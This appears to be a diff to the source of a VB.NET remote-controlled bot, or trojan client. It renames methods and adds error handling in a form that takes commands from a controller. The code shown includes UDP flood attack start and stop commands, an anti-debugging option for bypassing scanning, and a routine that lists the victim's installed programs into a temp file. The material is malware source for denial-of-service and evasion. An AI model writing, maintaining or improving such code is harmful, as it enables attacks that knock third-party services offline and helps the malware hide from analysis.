@@ -130,7 +130,7 @@ Public Class Form1
             End If
 
             If BypassScanning = "True" Then
-                Dim bypass As New Screening_Programs
+                Dim bypass As New Anti_Debugging
                 bypass.Start()
             End If
 
@@ -233,7 +233,7 @@ Public Class Form1
                                     UDP.Threadsto = A(3)
                                     UDP.Time = A(4)
                                     UDP.DOSData = Randomisi(300)
-                                    UDP.Start()
+                                    UDP.StartUDP()
                                     C.Send("CleanCommands")
                                     C.Log("Succ", "UDP Attack Started")
                                 Catch ex As Exception
@@ -299,7 +299,7 @@ Public Class Form1
                         Select Case A(1)
                             Case "UDPAttack"
                                 Try
-                                    UDP.Abort()
+                                    UDP.StopUDP()
                                     C.Send("CleanCommands")
                                     C.Log("Succ", "UDP Attack Stopped")
                                 Catch ex As Exception
@@ -803,14 +803,18 @@ Public Class Form1
         End If
     End Sub
     Public Function ProgramList()
-        On Error Resume Next
-        Dim TextBox2 As New TextBox
-        Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
-        For Each text As String In Directory.GetDirectories(folderPath)
-            Dim text2 As String = text.Substring(text.LastIndexOf("\")).Replace("\", String.Empty) & vbCrLf
-            TextBox2.AppendText(text2)
-            File.WriteAllText(TempPath + "\\ProgramList.txt", TextBox2.Text)
-        Next
+        Try
+            Dim TextBox2 As New TextBox
+            Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
+            For Each text As String In Directory.GetDirectories(folderPath)
+                Dim text2 As String = text.Substring(text.LastIndexOf("\")).Replace("\", String.Empty) & vbCrLf
+                TextBox2.AppendText(text2)
+                File.WriteAllText(TempPath + "\\ProgramList.txt", TextBox2.Text)
+            Next
+            Return True
+        Catch ex As Exception
+            Return False
+        End Try
     End Function
     Public Function Randomisi(ByVal lenght As Integer) As String
         Randomize()
